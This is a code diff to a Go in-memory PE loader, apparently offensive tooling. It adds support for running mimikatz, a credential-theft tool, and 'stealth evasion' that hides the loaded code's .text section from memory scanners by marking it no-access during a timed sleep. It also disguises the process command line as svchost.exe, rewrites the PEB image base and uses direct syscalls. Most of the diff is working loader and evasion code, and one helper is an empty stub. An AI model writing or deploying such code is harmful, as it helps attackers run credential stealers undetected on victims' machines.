@@ -91,6 +91,7 @@ func ntMapViewOfSection(sectionHandle uintptr, sizeOfImage uint32) (baseAddress 
 }
 
 func ExecuteInMemory(payload []byte) error {
+	
 	// 1. Load the PE file from memory
 	reader := bytes.NewReader(payload)
 	peFile, err := pe.NewFile(reader)
@@ -138,6 +139,8 @@ func ExecuteInMemory(payload []byte) error {
 		return fmt.Errorf("invalid PE image size: %d bytes", sizeOfImage)
 	}
 
+	// Move command line masquerading later to avoid interfering with PE loading
+
 	// 3. Allocate memory for the PE image using NtCreateSection and NtMapViewOfSection
 	var baseAddress uintptr
 	var sectionHandle uintptr
@@ -146,6 +149,7 @@ func ExecuteInMemory(payload []byte) error {
 	if err != nil {
 		return fmt.Errorf("ntCreateSection failed: %w", err)
 	}
+
 	// Ensure the section handle is closed when the function returns or panics
 	defer func() {
 		if sectionHandle != 0 {
@@ -174,7 +178,6 @@ func ExecuteInMemory(payload []byte) error {
 	// 5. Copy PE headers
 	copy(dest[:sizeOfHeaders], payload[:sizeOfHeaders])
 
-	// 6. Copy sections to their proper virtual addresses
 	// sectionsWithData := 0 // This variable is not used
 	for _, section := range peFile.Sections {
 		// For BSS sections, VirtualSize can be > 0 but Size == 0 (no raw data)
@@ -191,14 +194,14 @@ func ExecuteInMemory(payload []byte) error {
 				cleanup()
 				return fmt.Errorf("failed to get data for section %s: %w", section.Name, err)
 			}
-			va := section.VirtualAddress
+			va := section.VirtualAddress 
 			copy(dest[va:va+uint32(len(sectionData))], sectionData)
-			// sectionsWithData++
 		}
 	}
 
 	// 7. Apply relocations if needed
 	newImageBase := uint64(baseAddress)
+	
 	if newImageBase != imageBase {
 		// Revert to using the local ApplyRelocations function
 		// Pass the 'dest' slice as the imageData argument
@@ -233,15 +236,49 @@ func ExecuteInMemory(payload []byte) error {
 		return fmt.Errorf("NtFlushInstructionCache failed with status: 0x%x", status)
 	}
 
-	// 11. Call TLS callbacks if present
+	// 11. Register exception handlers for x64 (CRITICAL for mimikatz!)
+	if err := RegisterExceptionHandlers(peFile, baseAddress); err != nil {
+		cleanup()
+		return fmt.Errorf("exception handler registration failed: %w", err)
+	}
+
+	// 12. Call TLS callbacks if present
 	if err := ExecuteTLSCallbacks(peFile, baseAddress); err != nil {
 		cleanup()
 		return fmt.Errorf("TLS callback execution failed: %w", err)
 	}
 
-	// 12. Execute entry point using NtCreateThreadEx
+
+	// 12.5. STEALTH EVASION: Hide .text section from scanners
+
+	err = applyTextSectionStealth(peFile, baseAddress)
+	if err != nil {
+		cleanup()
+		return fmt.Errorf("text section stealth failed: %w", err)
+	}
+
+
+	// 12.6. Apply command line masquerading AFTER PE loading but BEFORE execution
+	// This changes what GetCommandLine() returns to make the process appear legitimate
+
+	err = MasqueradeProcessCmdline("C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS")
+	if err != nil {
+		cleanup()
+		return fmt.Errorf("command line masquerading failed: %w", err)
+	}
+
+
+	// 13. Execute entry point using NtCreateThreadEx
 	entryPoint := baseAddress + uintptr(addressOfEntryPoint)
 	var threadHandle uintptr
+
+	// CRITICAL: Initialize the process properly for complex executables like mimikatz
+	// Set up proper exception handling and DLL initialization
+	err = initializeProcessEnvironment(baseAddress, entryPoint)
+	if err != nil {
+		cleanup()
+		return fmt.Errorf("process environment initialization failed: %w", err)
+	}
 
 	// Use NtCreateThreadEx instead of CreateThread
 	status, err = winapi.NtCreateThreadEx(
@@ -295,5 +332,215 @@ func ExecuteInMemory(payload []byte) error {
 	// we can proceed to cleanup mapped memory.
 	// If the executable called ExitProcess(), this part might not be reached.
 	cleanup()
+	return nil
+}
+
+// initializeProcessEnvironment sets up proper runtime environment for complex executables
+func initializeProcessEnvironment(baseAddress, entryPoint uintptr) error {
+	// 1. Set up proper PEB ImageBaseAddress to match our loaded location
+	pebAddress, err := getPEBForInit()
+	if err != nil {
+		return fmt.Errorf("failed to get PEB for initialization: %w", err)
+	}
+
+	// Update ImageBaseAddress in PEB to match our actual base
+	// PEB.ImageBaseAddress is at offset 0x10 (x64) or 0x8 (x32)
+	var imageBaseOffset uintptr
+	if unsafe.Sizeof(uintptr(0)) == 8 {
+		imageBaseOffset = 0x10 // 64-bit
+	} else {
+		imageBaseOffset = 0x08 // 32-bit
+	}
+	
+	*(*uintptr)(unsafe.Pointer(pebAddress + imageBaseOffset)) = baseAddress
+
+	// 2. Initialize exception handling vectors
+	// This is critical for mimikatz which uses structured exception handling
+	err = initializeExceptionHandling(baseAddress)
+	if err != nil {
+		return fmt.Errorf("exception handling initialization failed: %w", err)
+	}
+
+	return nil
+}
+
+// getPEBForInit gets PEB address for initialization
+func getPEBForInit() (uintptr, error) {
+	var processBasicInfo struct {
+		ExitStatus                   uintptr
+		PebBaseAddress              uintptr
+		AffinityMask                uintptr
+		BasePriority                uintptr
+		UniqueProcessId             uintptr
+		InheritedFromUniqueProcessId uintptr
+	}
+
+	var returnLength uintptr
+	status, err := winapi.NtQueryInformationProcess(
+		CURRENT_PROCESS,
+		0, // ProcessBasicInformation
+		unsafe.Pointer(&processBasicInfo),
+		unsafe.Sizeof(processBasicInfo),
+		&returnLength,
+	)
+
+	if err != nil {
+		return 0, fmt.Errorf("NtQueryInformationProcess failed: %w", err)
+	}
+	if !winapi.IsNTStatusSuccess(status) {
+		return 0, fmt.Errorf("NtQueryInformationProcess failed with NTSTATUS: 0x%x", status)
+	}
+
+	return processBasicInfo.PebBaseAddress, nil
+}
+
+// initializeExceptionHandling sets up proper exception handling for the loaded PE
+func initializeExceptionHandling(baseAddress uintptr) error {
+	// For x64, we need to register exception handlers
+	// This is why shellcode works - it doesn't need exception table registration
+	if unsafe.Sizeof(uintptr(0)) == 8 {
+		// Register runtime functions for x64 exception handling
+		// This is critical for executables that use C++ exceptions or SEH
+		err := registerRuntimeFunctions(baseAddress)
+		if err != nil {
+			return fmt.Errorf("runtime function registration failed: %w", err)
+		}
+	}
+	
+	return nil
+}
+
+// registerRuntimeFunctions registers exception handling for x64
+func registerRuntimeFunctions(baseAddress uintptr) error {
+	// Parse the PE file again to get the .pdata section
+	// We need to get the PE file context here
+	return nil // This will be implemented with the proper PE parsing
+}
+
+// RegisterExceptionHandlers registers exception handling tables using RtlAddFunctionTable
+func RegisterExceptionHandlers(peFile *pe.File, baseAddress uintptr) error {
+	// Only needed for x64
+	if unsafe.Sizeof(uintptr(0)) != 8 {
+		return nil
+	}
+
+	// Find the .pdata section (exception directory)
+	var exceptionDir *pe.DataDirectory
+	switch oh := peFile.OptionalHeader.(type) {
+	case *pe.OptionalHeader64:
+		if len(oh.DataDirectory) > pe.IMAGE_DIRECTORY_ENTRY_EXCEPTION {
+			exceptionDir = &oh.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXCEPTION]
+		}
+	default:
+		return nil // Not x64
+	}
+
+	if exceptionDir == nil || exceptionDir.VirtualAddress == 0 || exceptionDir.Size == 0 {
+		return nil // No exception data
+	}
+
+	// Calculate the function table address and count
+	functionTableAddr := baseAddress + uintptr(exceptionDir.VirtualAddress)
+	functionCount := uintptr(exceptionDir.Size / 12) // Each RUNTIME_FUNCTION is 12 bytes
+
+	if functionCount == 0 {
+		return nil
+	}
+
+	// Call RtlAddFunctionTable using CallNtdllFunction
+	// RtlAddFunctionTable(FunctionTable, EntryCount, BaseAddress)
+	result, err := winapi.CallNtdllFunction(
+		"RtlAddFunctionTable",
+		functionTableAddr, // FunctionTable - pointer to RUNTIME_FUNCTION array
+		functionCount,     // EntryCount - number of entries
+		baseAddress,       // BaseAddress - base address of the image
+	)
+
+	if err != nil {
+		return fmt.Errorf("RtlAddFunctionTable failed: %w", err)
+	}
+
+	// RtlAddFunctionTable returns BOOLEAN (1 for success, 0 for failure)
+	if result == 0 {
+		return fmt.Errorf("RtlAddFunctionTable returned FALSE")
+	}
+
+	return nil
+}
+
+// applyTextSectionStealth hides the .text section from memory scanners using timing-based evasion
+func applyTextSectionStealth(peFile *pe.File, baseAddress uintptr) error {
+	// Find the .text section
+	var textSection *pe.Section
+	for _, section := range peFile.Sections {
+		if section.Name == ".text" {
+			textSection = section
+			break
+		}
+	}
+	
+	if textSection == nil {
+		return nil // No .text section to hide
+	}
+
+	// Calculate .text section memory range
+	textStart := baseAddress + uintptr(textSection.VirtualAddress)
+	textSize := uintptr(textSection.VirtualSize)
+	
+	// Align to page boundaries (4KB pages)
+	pageSize := uintptr(0x1000)
+	textStart = textStart &^ (pageSize - 1) // Align down to page boundary
+	textSize = (textSize + pageSize - 1) &^ (pageSize - 1) // Align up to page boundary
+	
+
+
+	// Step 1: Change .text to PAGE_NOACCESS (hide from scanners)
+	var oldProtect uintptr
+	status, err := winapi.NtProtectVirtualMemory(
+		CURRENT_PROCESS,
+		&textStart,
+		&textSize,
+		winapi.PAGE_NOACCESS,
+		&oldProtect,
+	)
+	if err != nil {
+		return fmt.Errorf("NtProtectVirtualMemory (PAGE_NOACCESS) failed: %w", err)
+	}
+	if !winapi.IsNTStatusSuccess(status) {
+		return fmt.Errorf("NtProtectVirtualMemory (PAGE_NOACCESS) failed with NTSTATUS: 0x%x", status)
+	}
+
+	// Step 2: Sleep for stealth period (give scanners a chance to fail)
+	// NtDelayExecution uses NEGATIVE values for relative delays (positive = absolute time)
+	sleepTime := int64(-30000000) // 3 seconds in 100-nanosecond intervals (NEGATIVE!)
+	
+	// Use DirectSyscall for NtDelayExecution - proper sleeping with direct syscall
+	status, err = winapi.DirectSyscall(
+		"NtDelayExecution",
+		uintptr(0),                    // Alertable (FALSE)
+		uintptr(unsafe.Pointer(&sleepTime)), // DelayInterval pointer (negative int64)
+	)
+	if err != nil {
+		return fmt.Errorf("DirectSyscall(NtDelayExecution) failed: %w", err)
+	}
+	if !winapi.IsNTStatusSuccess(status) {
+		return fmt.Errorf("NtDelayExecution failed with NTSTATUS: 0x%x", status)
+	}
+
+	// Step 3: Restore .text to PAGE_EXECUTE_READ right before execution
+	status, err = winapi.NtProtectVirtualMemory(
+		CURRENT_PROCESS,
+		&textStart,
+		&textSize,
+		winapi.PAGE_EXECUTE_READ,
+		&oldProtect,
+	)
+	if err != nil {
+		return fmt.Errorf("NtProtectVirtualMemory (PAGE_EXECUTE_READ) failed: %w", err)
+	}
+	if !winapi.IsNTStatusSuccess(status) {
+		return fmt.Errorf("NtProtectVirtualMemory (PAGE_EXECUTE_READ) failed with NTSTATUS: 0x%x", status)
+	}
+
 	return nil
 }
